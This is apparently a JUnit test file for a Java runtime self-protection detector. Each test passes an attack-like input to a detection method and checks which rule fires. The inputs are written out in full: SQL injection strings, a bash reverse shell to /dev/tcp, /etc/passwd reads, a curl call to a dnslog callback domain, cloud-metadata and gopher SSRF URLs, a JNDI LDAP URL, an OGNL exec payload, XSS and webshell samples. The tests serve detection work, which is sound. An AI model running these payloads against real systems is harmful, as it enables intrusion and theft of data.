package io.ohmyrasp.agent.detect;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;

import io.ohmyrasp.agent.model.Detection;
import io.ohmyrasp.agent.model.RequestContext;
import java.util.List;
import java.util.Map;
import java.util.Optional;
import org.junit.jupiter.api.Test;

final class DetectorEngineTest {
  private final DetectorEngine engine = new DetectorEngine();

  @Test
  void detectsSqlUserInput() {
    var result =
        engine.detectSql(
            "select * from users where name = '' OR '1'='1'",
            request(Map.of("value", List.of("' OR '1'='1"))));

    assertTrue(result.isPresent());
    assertEquals("sql_userinput", result.orElseThrow().algorithm());
  }

  @Test
  void detectsSqlPolicyFeatures() {
    var result = engine.detectSql("select 1 union select password from users", request());

    assertTrue(result.isPresent());
    assertEquals("sql_policy", result.orElseThrow().algorithm());
  }

  @Test
  void detectsSqlExceptionSignals() {
    var result =
        engine.detectSqlException(
            "mysql",
            "1064",
            "",
            "You have an error in your SQL syntax",
            "select * from where",
            request());

    assertAlgorithm(result, "sql_exception");
  }

  @Test
  void detectsSqlRegex() {
    var result =
        engine.detectSqlRegex(
            "select table_name from information_schema.tables", "information_schema", request());

    assertAlgorithm(result, "sql_regex");
  }

  @Test
  void detectsCommandUserInput() {
    var result =
        engine.detectCommand(
            List.of("sh", "-c", "echo ok; cat /etc/passwd"),
            request(Map.of("cmd", List.of("cat /etc/passwd"))));

    assertTrue(result.isPresent());
    assertEquals("command_userinput", result.orElseThrow().algorithm());
  }

  @Test
  void detectsCommonDangerousCommand() {
    var result = engine.detectCommand(List.of("bash", "-i", ">&", "/dev/tcp/127.0.0.1/4444"), request());

    assertTrue(result.isPresent());
    assertEquals("command_common", result.orElseThrow().algorithm());
  }

  @Test
  void detectsReflectiveCommandStack() {
    var result =
        engine.detectCommand(
            List.of("id"), request(), List.of("java.lang.reflect.Method", "example.Shell"));

    assertAlgorithm(result, "command_reflect");
  }

  @Test
  void detectsCommandSyntaxError() {
    var result = engine.detectCommand(List.of("sh", "-c", "echo 'unterminated"), request());

    assertAlgorithm(result, "command_error");
  }

  @Test
  void detectsDnslogCommand() {
    var result = engine.detectCommand(List.of("curl", "http://abc.dnslog.cn/a"), request());

    assertAlgorithm(result, "command_dnslog");
  }

  @Test
  void detectsSsrfAwsMetadata() {
    var result = engine.detectUrl("http://169.254.169.254/latest/meta-data/", request());

    assertTrue(result.isPresent());
    assertEquals("ssrf_aws", result.orElseThrow().algorithm());
  }

  @Test
  void detectsSsrfUserInput() {
    var result =
        engine.detectUrl(
            "http://127.0.0.1/admin",
            request(Map.of("url", List.of("http://127.0.0.1/admin"))));

    assertAlgorithm(result, "ssrf_userinput");
  }

  @Test
  void detectsSsrfProtocol() {
    var result = engine.detectUrl("gopher://127.0.0.1:6379/_info", request());

    assertAlgorithm(result, "ssrf_protocol");
  }

  @Test
  void ignoresLocalClasspathJarResource() {
    var result =
        engine.detectUrl(
            "jar:file:/usr/local/tomcat/lib/servlet-api.jar!/jakarta/servlet/LocalStrings.properties",
            request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresTomcatLibraryFileResource() {
    var result = engine.detectUrl("file:/usr/local/tomcat/lib/servlet-api.jar", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsSsrfCommonCallbackDomain() {
    var result = engine.detectUrl("http://probe.dnslog.cn/callback", request());

    assertAlgorithm(result, "ssrf_common");
  }

  @Test
  void detectsSsrfObfuscatedHost() {
    var result = engine.detectUrl("http://2130706433/", request());

    assertAlgorithm(result, "ssrf_obfuscate");
  }

  @Test
  void detectsDnslogHost() {
    var result = engine.detectDns("abc.dnslog.cn", request());

    assertTrue(result.isPresent());
    assertEquals("dns_blacklist", result.orElseThrow().algorithm());
  }

  @Test
  void detectsSensitiveFileRead() {
    var result = engine.detectFileRead("/etc/passwd", request(), false);

    assertTrue(result.isPresent());
    assertEquals("readFile_unwanted", result.orElseThrow().algorithm());
  }

  @Test
  void detectsHttpFileReadFromUserInput() {
    var result =
        engine.detectFileRead(
            "http://127.0.0.1/internal",
            request(Map.of("file", List.of("http://127.0.0.1/internal"))),
            false);

    assertAlgorithm(result, "readFile_userinput_http");
  }

  @Test
  void detectsUnwantedFileReadProtocolFromUserInput() {
    var result =
        engine.detectFileRead(
            "file:///etc/passwd", request(Map.of("file", List.of("file:///etc/passwd"))), false);

    assertAlgorithm(result, "readFile_userinput_unwanted");
  }

  @Test
  void detectsFileReadOutsideWebroot() {
    var result = engine.detectFileRead("/etc/hosts", request(), false);

    assertAlgorithm(result, "readFile_outsideWebroot");
  }

  @Test
  void detectsXxeFileReadFromParserStackHint() {
    var result = engine.detectFileRead("/etc/passwd", request(), true);

    assertTrue(result.isPresent());
    assertEquals("xxe_file", result.orElseThrow().algorithm());
  }

  @Test
  void detectsScriptFileWrite() {
    var result = engine.detectFileWrite("/usr/local/tomcat/webapps/ROOT/shell.jsp", request());

    assertTrue(result.isPresent());
    assertEquals("writeFile_script", result.orElseThrow().algorithm());
  }

  @Test
  void detectsNtfsFileWrite() {
    var result = engine.detectFileWrite("C:/inetpub/wwwroot/upload.txt::$DATA", request());

    assertAlgorithm(result, "writeFile_NTFS");
  }

  @Test
  void detectsReflectiveJspFileWrite() {
    var result =
        engine.detectFileWrite(
            "/usr/local/tomcat/webapps/ROOT/shell.jsp",
            request(),
            List.of("java.lang.reflect.Method", "shell.Backdoor"));

    assertAlgorithm(result, "writeFile_reflect");
  }

  @Test
  void detectsDirectoryUserInput() {
    var result = engine.detectDirectoryList("/etc", request(Map.of("path", List.of("/etc"))));

    assertTrue(result.isPresent());
    assertEquals("directory_userinput", result.orElseThrow().algorithm());
  }

  @Test
  void detectsUnwantedDirectoryList() {
    var result = engine.detectDirectoryList("/root", request());

    assertAlgorithm(result, "directory_unwanted");
  }

  @Test
  void detectsReflectiveDirectoryList() {
    var result =
        engine.detectDirectoryList("/tmp", request(), List.of("java.lang.reflect.Method"));

    assertAlgorithm(result, "directory_reflect");
  }

  @Test
  void detectsIncludeUserInput() {
    var result =
        engine.detectInclude(
            "/etc/passwd", "/etc/passwd", "include", request(Map.of("file", List.of("/etc/passwd"))));

    assertAlgorithm(result, "include_userinput");
  }

  @Test
  void detectsIncludeProtocol() {
    var result = engine.detectInclude("jar://file:/tmp/a.jar!/x", "", "include", request());

    assertAlgorithm(result, "include_protocol");
  }

  @Test
  void detectsMultipartScriptUpload() {
    var result = engine.detectFileUpload("shell.jsp", request());

    assertAlgorithm(result, "fileUpload_multipart_script");
  }

  @Test
  void detectsMultipartHtmlUpload() {
    var result = engine.detectFileUpload("phish.html", request());

    assertAlgorithm(result, "fileUpload_multipart_html");
  }

  @Test
  void detectsMultipartExecutableUpload() {
    var result = engine.detectFileUpload("dropper.exe", request());

    assertAlgorithm(result, "fileUpload_multipart_exe");
  }

  @Test
  void detectsWebdavUpload() {
    var result = engine.detectWebdavUpload("avatar.jpg", "shell.jsp", "MOVE", request());

    assertAlgorithm(result, "fileUpload_webdav");
  }

  @Test
  void detectsRenameWebshell() {
    var result = engine.detectRename("avatar.jpg", "shell.jsp", request());

    assertAlgorithm(result, "rename_webshell");
  }

  @Test
  void detectsLinkWebshell() {
    var result = engine.detectLink("avatar.jpg", "shell.jsp", "hard", request());

    assertAlgorithm(result, "link_webshell");
  }

  @Test
  void detectsJndi() {
    var result = engine.detectJndi("ldap://127.0.0.1:1389/a", request());

    assertTrue(result.isPresent());
    assertEquals("jndi_disable_all", result.orElseThrow().algorithm());
  }

  @Test
  void detectsDeserializationBlacklist() {
    var result = engine.detectDeserialization("io.ohmyrasp.playground.EvilSerialized", request());

    assertTrue(result.isPresent());
    assertEquals("deserialization_blacklist", result.orElseThrow().algorithm());
  }

  @Test
  void detectsOgnlBlacklist() {
    var result = engine.detectOgnl("@java.lang.Runtime@getRuntime().exec('id')", request());

    assertAlgorithm(result, "ognl_blacklist");
  }

  @Test
  void detectsOgnlLengthLimit() {
    var result = engine.detectOgnl("a".repeat(401), request());

    assertAlgorithm(result, "ognl_length_limit");
  }

  @Test
  void detectsEvalRegex() {
    var result = engine.detectEval("eval", "return base64_decode($x);", request());

    assertAlgorithm(result, "eval_regex");
  }

  @Test
  void detectsLoadLibraryUnc() {
    var result = engine.detectLoadLibrary("System.load", "\\\\server\\share\\evil.dll", true, request());

    assertAlgorithm(result, "loadLibrary_unc");
  }

  @Test
  void detectsResponseIdentityCardLeak() {
    var result = engine.detectResponseDataLeak("application/json", "{\"id\":\"11010519491231002X\"}", request());

    assertAlgorithm(result, "response_dataLeak");
  }

  @Test
  void detectsResponseMobileLeak() {
    var result = engine.detectResponseDataLeak("text/html", "phone=13800138000", request());

    assertAlgorithm(result, "response_dataLeak");
  }

  @Test
  void detectsResponseBankCardLeak() {
    var result = engine.detectResponseDataLeak("application/xml", "<card>4111 1111 1111 1111</card>", request());

    assertAlgorithm(result, "response_dataLeak");
  }

  @Test
  void detectsXssEcho() {
    var result =
        engine.detectXssEcho(
            "hello <script>alert(1)</script>",
            request(Map.of("q", List.of("<script>alert(1)</script>"))));

    assertAlgorithm(result, "xss_echo");
  }

  @Test
  void detectsXssEchoContentWithoutRequestParameter() {
    var result = engine.detectXssEcho("hello <script>alert(1)</script>", request());

    assertAlgorithm(result, "xss_echo");
  }

  @Test
  void detectsWebshellEval() {
    var result =
        engine.detectWebshellEval("assert", "system('id')", request(Map.of("code", List.of("system('id')"))));

    assertAlgorithm(result, "webshell_eval");
  }

  @Test
  void detectsWebshellCommand() {
    var result =
        engine.detectWebshellCommand(
            List.of("sh", "-c", "id"), request(Map.of("cmd", List.of("sh -c id"))));

    assertAlgorithm(result, "webshell_command");
  }

  @Test
  void detectsWebshellFilePutContents() {
    var result =
        engine.detectWebshellFileWrite(
            "shell.jsp", "<% out.println(1); %>", request(Map.of("file", List.of("shell.jsp"))));

    assertAlgorithm(result, "webshell_file_put_contents");
  }

  @Test
  void detectsWebshellCallable() {
    var result = engine.detectWebshellCallable("system", request());

    assertAlgorithm(result, "webshell_callable");
  }

  @Test
  void detectsWebshellLdPreload() {
    var result = engine.detectWebshellLdPreload("LD_PRELOAD", "/tmp/evil.so", request());

    assertAlgorithm(result, "webshell_ld_preload");
  }

  @Test
  void detectsXxeProtocol() {
    var result = engine.detectXxeEntity("xxe", "file:///etc/passwd", request());

    assertTrue(result.isPresent());
    assertEquals("xxe_protocol", result.orElseThrow().algorithm());
  }

  @Test
  void detectsScannerRequest() {
    var context =
        new RequestContext(
            "GET", "/rasp/request", "", Map.of(), Map.of("user-agent", "sqlmap/1.7"));

    var result = engine.detectRequest(context);

    assertTrue(result.isPresent());
    assertEquals("request_scanner", result.orElseThrow().algorithm());
  }

  @Test
  void detectsUnusualRequest() {
    var context = new RequestContext("GET", "/rasp/request", "", Map.of(), Map.of());

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_unusual");
  }

  @Test
  void detectsXssRequestInput() {
    var result = engine.detectRequest(request(Map.of("q", List.of("<script>alert(1)</script>"))));

    assertTrue(result.isPresent());
    assertEquals("xss_userinput", result.orElseThrow().algorithm());
  }

  private static RequestContext request() {
    return request(Map.of());
  }

  private static RequestContext request(Map<String, List<String>> parameters) {
    return new RequestContext(
        "GET", "/rasp/test", "", parameters, Map.of("user-agent", "JUnit"));
  }

  private static void assertAlgorithm(Optional<Detection> result, String algorithm) {
    assertTrue(result.isPresent());
    assertEquals(algorithm, result.orElseThrow().algorithm());
  }
}
